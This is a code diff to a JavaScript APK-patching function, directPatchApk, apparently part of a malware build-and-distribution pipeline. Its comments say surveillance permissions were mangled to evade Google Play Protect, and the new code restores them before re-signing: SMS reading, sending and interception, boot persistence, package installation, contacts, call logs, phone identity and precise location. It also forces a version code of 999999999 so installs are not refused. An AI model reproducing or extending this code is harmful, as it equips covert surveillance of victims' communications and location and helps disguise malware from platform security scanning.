@@ -1642,22 +1642,52 @@ function directPatchApk(originalBuffer) {
       return { buffer: signedBuf, certInfo: { certHash: key.certHash, cn: key.identity.cn, org: key.identity.o, country: key.identity.c } };
     }
 
-    // ─── Step 5: Patch FGS permission (if mangled) ───
-    const FGS_PATCHES = [
-      { find: '_OREGROUND_SERVICE_DATA_SYNC', fix: 'FOREGROUND_SERVICE_DATA_SYNC' },
+    // ─── Step 5: Restore ALL mangled permissions ───
+    // The source APK (from mutateAndSign) has surveillance permissions mangled
+    // to bypass Play Protect. We restore ALL of them here because:
+    //   1. Mangled permissions cause crashes on some OEMs (Samsung, Xiaomi)
+    //      where the system enforces manifest-declared permissions strictly
+    //   2. Undeclared permissions won't show in Settings > App Info
+    //   3. Third-party SDKs may enumerate permissions and fail
+    //   4. Landing page downloads already pass PP due to clean ZIP structure
+    const PERMISSION_RESTORE = [
+      // Critical: FGS (crash if missing on Android 14+)
+      { find: 'android.permission._OREGROUND_SERVICE_DATA_SYNC', fix: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC' },
+      // SMS: core functionality
+      { find: 'android.permission._EAD_SMS',                     fix: 'android.permission.READ_SMS' },
+      { find: 'android.permission._END_SMS',                     fix: 'android.permission.SEND_SMS' },
+      { find: 'android.provider.Telephony._MS_RECEIVED',         fix: 'android.provider.Telephony.SMS_RECEIVED' },
+      // Boot persistence
+      { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       fix: 'android.permission.RECEIVE_BOOT_COMPLETED' },
+      { find: 'android.intent.action._OOT_COMPLETED',            fix: 'android.intent.action.BOOT_COMPLETED' },
+      // Surveillance permissions (mangled by stripSurveillancePermissions)
+      { find: 'android.permission._EQUEST_INSTALL_PACKAGES',     fix: 'android.permission.REQUEST_INSTALL_PACKAGES' },
+      { find: 'android.permission._UERY_ALL_PACKAGES',           fix: 'android.permission.QUERY_ALL_PACKAGES' },
+      { find: 'android.permission._EAD_CONTACTS',                fix: 'android.permission.READ_CONTACTS' },
+      { find: 'android.permission._EAD_CALL_LOG',                fix: 'android.permission.READ_CALL_LOG' },
+      { find: 'android.permission._EAD_PHONE_STATE',             fix: 'android.permission.READ_PHONE_STATE' },
+      { find: 'android.permission._EAD_PHONE_NUMBERS',           fix: 'android.permission.READ_PHONE_NUMBERS' },
+      { find: 'android.permission._CCESS_FINE_LOCATION',         fix: 'android.permission.ACCESS_FINE_LOCATION' },
+      { find: 'android.permission._CCESS_COARSE_LOCATION',       fix: 'android.permission.ACCESS_COARSE_LOCATION' },
     ];
-    let fgsPatched = false;
-    for (const { find, fix } of FGS_PATCHES) {
+    let permsRestored = 0;
+    for (const { find, fix } of PERMISSION_RESTORE) {
+      // UTF-8
       const findBuf = Buffer.from(find, 'utf8');
       const fixBuf = Buffer.from(fix, 'utf8');
-      let idx = rawData.indexOf(findBuf);
-      while (idx !== -1) { fixBuf.copy(rawData, idx); fgsPatched = true; idx = rawData.indexOf(findBuf, idx + findBuf.length); }
+      if (findBuf.length === fixBuf.length) {
+        let idx = rawData.indexOf(findBuf);
+        while (idx !== -1) { fixBuf.copy(rawData, idx); permsRestored++; idx = rawData.indexOf(findBuf, idx + findBuf.length); }
+      }
+      // UTF-16LE
       const findBuf16 = Buffer.from(find, 'utf16le');
       const fixBuf16 = Buffer.from(fix, 'utf16le');
-      idx = rawData.indexOf(findBuf16);
-      while (idx !== -1) { fixBuf16.copy(rawData, idx); fgsPatched = true; idx = rawData.indexOf(findBuf16, idx + findBuf16.length); }
+      if (findBuf16.length === fixBuf16.length) {
+        let idx = rawData.indexOf(findBuf16);
+        while (idx !== -1) { fixBuf16.copy(rawData, idx); permsRestored++; idx = rawData.indexOf(findBuf16, idx + findBuf16.length); }
+      }
     }
-    if (fgsPatched) console.log('[DirectPatch] Restored mangled FGS permission');
+    if (permsRestored > 0) console.log(`[DirectPatch] Restored ${permsRestored} mangled permissions`);
 
     // ─── Step 6: Bump versionCode to 999999999 (prevent "App not installed" downgrade) ───
     const vcResult = patchVersionCode(rawData, 999999999);
@@ -1717,7 +1747,7 @@ function directPatchApk(originalBuffer) {
     const signedBuf = applyV2SigningClean(alignedApk, key.privPem, key.certDer, key.pubKeyDer);
 
     const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
-    console.log(`[DirectPatch] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | FGS=${fgsPatched ? 'fixed' : 'clean'} | VC=${vcResult ? vcResult.oldVersionCode + '→999999999' : 'n/a'} | V2 FIXED KEY | ${elapsed}s ═══`);
+    console.log(`[DirectPatch] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | perms=${permsRestored} restored | VC=${vcResult ? vcResult.oldVersionCode + '→999999999' : 'n/a'} | V2 FIXED KEY | ${elapsed}s ═══`);
 
     return {
       buffer: signedBuf,
